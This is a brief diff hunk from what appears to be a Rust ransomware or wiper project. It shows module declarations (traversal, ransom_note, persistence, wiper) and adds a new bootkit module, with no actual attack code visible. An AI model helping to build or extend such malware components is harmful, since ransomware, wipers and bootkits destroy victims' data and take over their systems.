@@ -3,6 +3,7 @@ mod traversal;
 mod ransom_note;
 mod persistence;
 mod wiper;
+mod bootkit;
 
 use rayon::prelude::*;
 use std::process::Command;
